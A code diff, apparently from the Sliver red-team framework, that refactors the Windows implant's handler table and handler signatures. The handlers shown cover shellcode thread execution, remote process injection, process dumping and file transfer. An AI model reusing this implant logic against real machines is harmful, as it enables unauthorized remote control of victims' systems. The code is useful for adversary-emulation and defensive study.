@@ -6,7 +6,7 @@ import (
 	// {{else}}
 	// {{end}}
 
-	pb "sliver/protobuf"
+	pb "sliver/protobuf/sliver"
 	"syscall"
 	"unsafe"
 
@@ -14,30 +14,31 @@ import (
 )
 
 var (
-	windowsHandlers = map[string]interface{}{
+	windowsHandlers = map[uint32]RPCHandler{
 		pb.MsgTask:           taskHandler,
 		pb.MsgRemoteTask:     remoteTaskHandler,
-		pb.MsgPsListReq:      psHandler,
-		pb.MsgPing:           pingHandler,
-		pb.MsgKill:           killHandler,
-		pb.MsgDirListReq:     dirListHandler,
-		pb.MsgDownloadReq:    downloadHandler,
-		pb.MsgUploadReq:      uploadHandler,
-		pb.MsgCdReq:          cdHandler,
-		pb.MsgPwdReq:         pwdHandler,
-		pb.MsgRmReq:          rmHandler,
-		pb.MsgMkdirReq:       mkdirHandler,
 		pb.MsgProcessDumpReq: dumpHandler,
+
+		pb.MsgPsListReq:   psHandler,
+		pb.MsgPing:        pingHandler,
+		pb.MsgKill:        killHandler,
+		pb.MsgDirListReq:  dirListHandler,
+		pb.MsgDownloadReq: downloadHandler,
+		pb.MsgUploadReq:   uploadHandler,
+		pb.MsgCdReq:       cdHandler,
+		pb.MsgPwdReq:      pwdHandler,
+		pb.MsgRmReq:       rmHandler,
+		pb.MsgMkdirReq:    mkdirHandler,
 	}
 )
 
-func getSystemHandlers() map[string]interface{} {
+func getSystemHandlers() map[uint32]RPCHandler {
 	return windowsHandlers
 }
 
 // ---------------- Windows Handlers ----------------
 
-func taskHandler(send chan *pb.Envelope, data []byte) {
+func taskHandler(data []byte, resp RPCResponse) {
 	task := &pb.Task{}
 	err := proto.Unmarshal(data, task)
 	if err != nil {
@@ -57,9 +58,10 @@ func taskHandler(send chan *pb.Envelope, data []byte) {
 	log.Printf("creating local thread with start address: 0x%08x", addr)
 	// {{end}}
 	createThread.Call(0, 0, addr, 0, 0, 0)
+	resp([]byte{}, nil)
 }
 
-func remoteTaskHandler(send chan *pb.Envelope, data []byte) {
+func remoteTaskHandler(data []byte, resp RPCResponse) {
 	remoteTask := &pb.RemoteTask{}
 	err := proto.Unmarshal(data, remoteTask)
 	if err != nil {
@@ -68,7 +70,8 @@ func remoteTaskHandler(send chan *pb.Envelope, data []byte) {
 		// {{end}}
 		return
 	}
-	remoteThreadTaskInjection(int(remoteTask.Pid), remoteTask.Data)
+	err = remoteThreadTaskInjection(int(remoteTask.Pid), remoteTask.Data)
+	resp([]byte{}, err)
 }
 
 // ---------------- Platform Code ----------------
